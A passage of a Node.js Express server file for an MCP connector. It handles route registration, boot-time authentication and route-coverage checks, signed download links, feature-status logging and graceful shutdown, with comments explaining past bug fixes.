    const modulesDir    = pathJoin(SKILL_BASE_DIR, "modules");

    for (const { moduleId, score, entry } of selected) {
      const paths = [
        pathJoin(modulesDir, moduleId + ".md"),
        pathJoin(SKILL_BASE_DIR, moduleId + ".md"),
      ];
      let content = null;
      for (const p of paths) {
        if (existsSync(p)) { content = readFileSync(p, "utf8"); break; }
      }
      if (!content) { log("warn", `[ti-skill-check-scope] Module file not found: ${moduleId}`); continue; }

      newModules.push(moduleId);
      triggerMatches[moduleId] = { score: Math.round(score * 100) / 100, triggers: (entry.dispatch_triggers || entry.triggers || []).slice(0, 5) };
      const body = content.replace(/^---[\s\S]*?---[\s]*?\n/m, "").trim();
      chunks.push(`### Module: ${moduleId}\n\n${body}`);
    }

    const sep = "\n\n---\n\n";
    const deltaContent = chunks.length
      ? `\n\n---\n\n## Mid-Session Specialist Modules\n\n${chunks.join(sep)}\n\n---\n`
      : null;

    log("info", `[ti-skill-check-scope] session=${session_id || "?"} new=${newModules.join(",") || "none"}`);
    return res.json({
      new_modules:     newModules,
      modules_loaded:  [...loaded_modules, ...newModules],
      delta_content:   deltaContent,
      trigger_matches: Object.keys(triggerMatches).length ? triggerMatches : undefined,
      checked_at:      new Date().toISOString(),
    });

  } catch (err) {
    log("error", `[ti-skill-check-scope] exception: ${err.message}`);
    return res.status(500).json({
      error: err.message, new_modules: [], modules_loaded: loaded_modules, delta_content: null, checked_at: new Date().toISOString(),
    });
  }
});


// -----------------------------------------------------------------------
// Route modules  (v12.22.0)
//
// These MUST be registered here, before the catch-all 404 below.
//
// Until v12.22.0 these three calls lived inside the httpServer.listen()
// callback, which runs after this file has finished evaluating. Express
// matches layers in registration order, so the catch-all below was always
// reached first and POST /provision and GET /export-all returned 404 for
// every request. Moving them ahead of the catch-all makes them reachable.
// -----------------------------------------------------------------------
registerProvisionRoute(app);
registerExportRoute(app);
registerVolumeSnapshotRoutes(app);

app.use((_req, res) => {
  res.status(404).json({
    error: "Not found",
    endpoints: {
      mcp:                   "POST /mcp",
      health:                "GET /health",
      volumeSnapshot:        "GET /volume-snapshot (X-Railway-Restore-Token required)",
      volumeRestore:         "POST /volume-restore (X-Railway-Restore-Token required)",
      volumeSnapshotStatus:  "GET /volume-snapshot/status (X-Railway-Restore-Token required)",
      restoreSkill:          "POST /restore-skill (X-Railway-Restore-Token required)",
      restoreBooks:          "POST /restore-books (X-Railway-Restore-Token required)",
      restoreProfiles:       "POST /restore-profiles (X-Railway-Restore-Token required)",
      restoreModules:        "POST /restore-modules (X-Railway-Restore-Token required)",
      restorePersonality:    "POST /restore-personality (X-Railway-Restore-Token required)",
      restoreDispatchRules:  "POST /restore-dispatch-rules (X-Railway-Restore-Token required)",
      restoreArchive:        "POST /restore-archive (X-Railway-Restore-Token required)",
      restoreReferences:     "POST /restore-references (X-Railway-Restore-Token required)",
      restoreScripts:        "POST /restore-scripts (X-Railway-Restore-Token required)",
      modularModeGet:        "GET /modular-mode (no auth)",
      modularModeSet:        "POST /set-modular-mode (X-Railway-Restore-Token required)",
      tiSkillCompile:        "POST /ti-skill-compile (X-Railway-Restore-Token required)",
      toolManifest:          "GET  /tools (X-Railway-Restore-Token required)",
      toolCall:              "POST /tool-call (X-Railway-Restore-Token required)",
      linkedinCallback:      "GET /auth/linkedin/callback",
      trackOpen:             "GET /track/open?id=...",
      trackClick:            "GET /track/click?id=...&url=...",
      upload:                "POST /upload/connections",
      previewDownload:       "GET /preview/:filename?exp=...&sig=... (or ?token=... when ALLOW_LEGACY_DOWNLOAD_TOKEN is on)",
      webhook:               "POST /webhook",
    },
  });
});

// -----------------------------------------------------------------------
// Pre-flight security gate  (v12.28.0 -- TNX-C-001 resolution items 2 and 4)
//
// Two assertions run BEFORE the listener is bound. Both are fatal.
//
//   1. assertMcpAuthConfigured() refuses to continue without a usable
//      MCP_API_KEY. The connector exposes remote Python execution, Google
//      Drive with full drive scope, WordPress publishing and SMTP dispatch.
//      A connector that starts without a key is the defect, so there is
//      deliberately no environment variable that suppresses this check.
//
//   2. assertAllRoutesCovered(app) walks the Express router stack and fails
//      the boot if any registered route was mounted ahead of the auth gate
//      without appearing on the documented allowlist. The class of bug behind
//      TNX-C-001 was not "someone forgot a check", it was "nothing verified
//      that checks existed", so the verification IS the remediation.
//
// Exiting non-zero here is what makes a misconfigured deploy fail loudly at
// the orchestrator instead of quietly serving an open tool surface.
// -----------------------------------------------------------------------
try {
  assertMcpAuthConfigured();
} catch (err) {
  console.error("[FATAL] Connector authentication is not configured.");
  console.error(err.message);
  process.exit(1);
}

// ---------------------------------------------------------------------------
// Signed download links  (TNX-FEAT-SIGNEDURLS)
//
// The secret is resolved at boot rather than lazily on the first download, so
// that a missing SIGNED_URL_SECRET or an unwritable /data volume is reported in
// the deployment log while an operator is still watching, instead of surfacing
// hours later as links that stopped working after a restart.
// ---------------------------------------------------------------------------
if (signedLinksEnabled()) {
  try {
    resolveSigningSecret(log);
    log("info",
      `Signed download links: ENABLED | expiry ${LINK_EXPIRY_SECONDS_CONFIGURED}s | ` +
      `legacy token accepted: ${String(process.env.ALLOW_LEGACY_DOWNLOAD_TOKEN || "true").trim().toLowerCase() !== "false"}`);
  } catch (err) {
    log("error", `Signed download links could not be initialised: ${err.message}`);
  }
} else {
  log("warn",
    "Signed download links: DISABLED (ENABLE_SIGNED_LINKS=false). Generated links carry the " +
    "global DOCUMENT_DOWNLOAD_TOKEN, never expire, and one leaked link exposes every document.");
}

try {
  const coverage = assertAllRoutesCovered(app);
  const allowlist = describeAuthAllowlist();
  log("info", `Auth gate: ACTIVE | ${coverage.checked} routes verified | ` +
    `public: ${allowlist.public.length} | self-authenticated: ${allowlist.selfAuthenticated.length}`);
} catch (err) {
  console.error("[FATAL] Route authentication coverage assertion failed.");
  console.error(err.message);
  process.exit(1);
}

// -----------------------------------------------------------------------
// Start
// -----------------------------------------------------------------------
const httpServer = createServer(app);

// v12.28.0 (TNX-H-006 item 4): the four Node HTTP timeouts. The connector had
// none of them set, so keepAliveTimeout sat at Node's 5s default, below the
// idle timeout of essentially every reverse proxy. The proxy reused a socket
// Node had already decided to close, and the client saw an unexplained
// ECONNRESET -- exactly the symptom the gateway's own comments describe having
// diagnosed and fixed on its side.
applyServerTimeouts(httpServer, { log });

httpServer.listen(PORT, HOST, () => {
  log("info", `claude-connector v12.28.0 on http://${HOST}:${PORT}`);
  log("info", `MCP: http://${HOST}:${PORT}/mcp (Authorization: Bearer <MCP_API_KEY> REQUIRED)`);
  log("info", `CORS: ${MCP_ALLOWED_ORIGINS.length ? MCP_ALLOWED_ORIGINS.join(", ") : "no origins configured (all cross-origin browser requests blocked)"}`);
  log("info", `LinkedIn OAuth: ${config.linkedinClientId ? "CONFIGURED" : "not configured"}`);
  log("info", `Email send: ${config.emailSendEnabled ? "ENABLED" : "disabled"} | ` +
    `HTML: ${config.emailHtmlEnabled ? "ENABLED" : "disabled"} | ` +
    `Tracking: ${config.emailTrackingEnabled ? "ENABLED" : "disabled"} | ` +
    `Scheduling: ${config.scheduleEnabled ? "ENABLED" : "disabled"}`);
  log("info", `Tracking endpoints: GET /track/open, GET /track/click`);
  log("info", "Psychology endpoints: ENABLED (emotion/taxonomy, sentiment/analyze, alignment/assess)");
  log("info", `Calendar: ${config.googleCalendarId || "primary"} | Sheets: ${config.googleSheetsId || "not configured"}`);
  log("info", `Slack: ${config.slackBotToken ? "CONFIGURED" : "not configured"} | Teams: ${config.teamsWebhookUrl ? "CONFIGURED" : "not configured"}`);
  log("info", `Webhook receiver: POST /webhook | Secret: ${config.webhookSecret ? "CONFIGURED" : "OPEN (set WEBHOOK_SECRET)"}`);
  log("info", `Web page fetch: ENABLED (web_fetch_page)`);
  log("info", `Drive overwrite: google_drive_overwrite_file | Legacy google_drive_upload: REMOVED`);

  log(
    "info",
    `Memory MCP: ${MEMORY_ENABLED ? "ENABLED" : "disabled (set AVA_MEMORY_WP_URL+AVA_MEMORY_WP_KEY or MEMORY_AUTH_TOKEN to enable)"}`,
  );

  log(
    "info",
    `Skill Volume: ${SKILL_ENABLED ? `ENABLED (${process.env.SKILL_FILE_PATH}) — skill_read, skill_write, skill_write_addition, skill_merge_additions, skill_history, skill_rollback, skill_audit` : "disabled (set SKILL_FILE_PATH to enable)"}`,
  );
  log("info", `Skill restore endpoint: ${SKILL_ENABLED && RAILWAY_RESTORE_TOKEN ? "ENABLED (POST /restore-skill)" : SKILL_ENABLED ? "disabled (set RAILWAY_RESTORE_TOKEN)" : "disabled (SKILL_FILE_PATH not set)"}`);
  log("info", `Books restore endpoint: ${SKILL_ENABLED && RAILWAY_RESTORE_TOKEN ? "ENABLED (POST /restore-books)" : "disabled (requires SKILL_FILE_PATH + RAILWAY_RESTORE_TOKEN)"}`);
  log("info", `Profiles: ${PROFILES_ENABLED ? "ENABLED (profile_read, profile_write_person)" : "disabled (set SKILL_FILE_PATH or PROFILES_FILE_PATH to enable)"}`);
  log("info", `Profiles restore endpoint: ${PROFILES_ENABLED && RAILWAY_RESTORE_TOKEN ? "ENABLED (POST /restore-profiles)" : "disabled (requires SKILL_FILE_PATH + RAILWAY_RESTORE_TOKEN)"}`);
    logTenantModeStatus();
    if ( isTenantMode() ) initDevice();
    // Self-Model Interrogation (Phase 1): create/open the self-model database on
    // the Railway volume so recording is ready before the first tool call.
    if (isSelfModelEnabled()) {
      try {
        const ok = initSelfModelDb();
        log("info", `Self-model: ${ok ? "ENABLED (self_model_query, per-turn recording)" : "unavailable (volume not writable — feature no-ops)"}`);
      } catch (err) {
        log("warn", `Self-model init failed at boot (feature will no-op): ${err.message}`);
      }
    } else {
      log("info", "Self-model: disabled (SELF_MODEL_ENABLED=false)");
    }
    // v12.22.0: registerProvisionRoute / registerExportRoute /
    // registerVolumeSnapshotRoutes moved to module scope above the catch-all
    // 404 handler. Registering them here left them permanently shadowed.
  log("info", `Modular skill: env_var=${process.env.SKILL_MODULAR_ENABLED || "not set"} | effective=${isModularEnabled() ? "ENABLED" : "disabled"} | runtime toggle: GET /modular-mode, POST /set-modular-mode`);
  log("info", `Person-aware dispatch: AVA_PERSON_PRIOR_ENABLED=${process.env.AVA_PERSON_PRIOR_ENABLED || "not set (defaults true)"}`);
  log("info", `Module restore endpoints: ${SKILL_ENABLED && RAILWAY_RESTORE_TOKEN ? "ENABLED (POST /restore-modules, /restore-personality, /restore-dispatch-rules)" : "disabled (requires SKILL_FILE_PATH + RAILWAY_RESTORE_TOKEN)"}`);
  log("info", `Content sections: ${SKILL_ENABLED ? "ENABLED (archive_list/read/write, reference_list/read/write, script_list/read/write)" : "disabled (set SKILL_FILE_PATH)"}`);
  log("info", `Content restore endpoints: ${SKILL_ENABLED && RAILWAY_RESTORE_TOKEN ? "ENABLED (POST /restore-archive, /restore-references, /restore-scripts)" : "disabled (requires SKILL_FILE_PATH + RAILWAY_RESTORE_TOKEN)"}`);
  log("info", `module_write: ${SKILL_ENABLED ? (isModularEnabled() ? "ENABLED (modular mode active)" : "disabled (modular mode off)") : "disabled (set SKILL_FILE_PATH)"}`);;

  // Boot the in-process scheduler (loads schedule_store.json + starts cron)
  try {
    startScheduler();
  } catch (err) {
    log("error", `Scheduler boot failed: ${err.message}`);
  }

  // ── Neural Core scanner (v12.36.0 — MANUAL TRIGGER ONLY) ────────────────
  // Boot does exactly one thing for the Neural Core now: it publishes this
  // connector's tool registry to the volume, so the scanner never has to ask
  // the network what tools exist. That is a single small JSON write. It spawns
  // nothing.
  //
  // The boot scan is GONE (v12.36.0). Previously, if the volume had no
  // ava_brain_data.json, the connector spawned brain_scan.py 15 seconds after
  // startup. On Railway every redeploy is a fresh container, so that made
  // "deploy" a scan trigger. It no longer is. There is also no periodic
  // rescan, and no tool-completion hook that scans.
  //
  // A scan now runs only when a person asks for one:
  //   POST /brain-scan, GET /brain-data?rescan=1, POST /volume-restore
  //   (scan=1, part of an operator-run restore), or script_execute directly.
  //
  // Consequence, stated plainly so it is not a surprise in an incident: a
  // volume with no scan stays with no scan until somebody clicks Refresh.
  // /brain-data and /brain-data/status both say so explicitly.
  try {
    setBrainScanLogger(log);
    const brainPaths = getBrainScanPaths();
    log("info", `Neural Core scanner: ${
      !brainPaths.enabled ? "disabled (BRAIN_SCAN_ENABLED=false)"
        : brainPaths.scannerPresent ? `ENABLED (${brainPaths.scannerPath}) — GET /brain-data`
        : `not deployed (expected at ${brainPaths.scannerPath})`
    }`);
    log("info", "Neural Core scan triggers: MANUAL ONLY (POST /brain-scan, GET /brain-data?rescan=1, POST /volume-restore). No boot scan, no cron, no tool-hook scan.");

    if (brainPaths.enabled) {
      // The catalogue is written even when the scanner is not deployed yet, so
      // it is already in place the moment someone uploads brain_scan.py.
      writeToolCatalog(buildEffectiveToolList());

      // Report the scan state at boot instead of acting on it. An operator
      // reading the logs after a deploy can see whether a manual scan is
      // needed, which is the one piece of the old boot scan worth keeping.
      const scanState = describeScanState();
      if (!brainPaths.scannerPresent) {
        log("info", "brain_scan: scanner not on the volume - nothing to scan with until it is uploaded");
      } else if (scanState.error) {
        log("warn", `brain_scan: cannot stat ${brainPaths.dataPath}: ${scanState.error}`);
      } else if (!scanState.present) {
        log("warn", "brain_scan: no scan on this volume. Run one manually (POST /brain-scan, or Refresh in the Neural Core) - the connector will NOT scan on its own.");
      } else if (scanState.empty) {
        log("warn", "brain_scan: the scan on disk is empty. Run one manually (POST /brain-scan, or Refresh in the Neural Core) - the connector will NOT rescan on its own.");
      } else {
        log("info", `brain_scan: scan present (${scanState.size} bytes) - serving it as-is`);
      }
    }
  } catch (err) {
    log("error", `Neural Core scanner boot failed: ${err.message}`);
  }
});

// ---------------------------------------------------------------------------
// Graceful shutdown  (v12.28.0 -- TNX-H-006)
//
// This replaces:
//
//     process.on("SIGINT",  () => { httpServer.close(() => process.exit(0)); });
//     process.on("SIGTERM", () => { httpServer.close(() => process.exit(0)); });
//
// which was the complete process handling for this service. It looks correct
// and is not. httpServer.close() waits INDEFINITELY for open connections to
// end, and this connector serves SSE, which by definition does not end. The
// callback was therefore never invoked, the process never exited, Railway
// SIGKILLed it after the grace period, and every in-flight tool call -- including
// long-running script_execute invocations -- was severed mid-frame. The old
// handler did not merely fail to drain; it guaranteed a hard kill on every
// redeploy.
//
// The replacement fails readiness, waits for the platform to deregister,
// notifies and then destroys SSE sockets so close() can actually return,
// flushes the schedule store, and holds an unref'd forced-exit deadline.
// ---------------------------------------------------------------------------
installShutdownHandlers({
  server: httpServer,
  log,

  // Both transports hold open responses. Legacy SSE keeps its transports in
  // sseSessions; Streamable HTTP keeps them in streamableSessions. Both must be
  // torn down or close() blocks on whichever was missed.
  getSseSessions: () => [
    ...Object.values(sseSessions || {}),
    ...Object.values(streamableSessions || {}),
  ],

  flushHooks: [
    {
      name: 'schedule store',
      run: () => {
        // The in-process cron scheduler persists on every mutation, but a
        // mutation in flight when SIGTERM arrives has not reached its own
        // save yet. Flushing here closes that window.
        return flushScheduleStore();
      },
    },
  ],
});
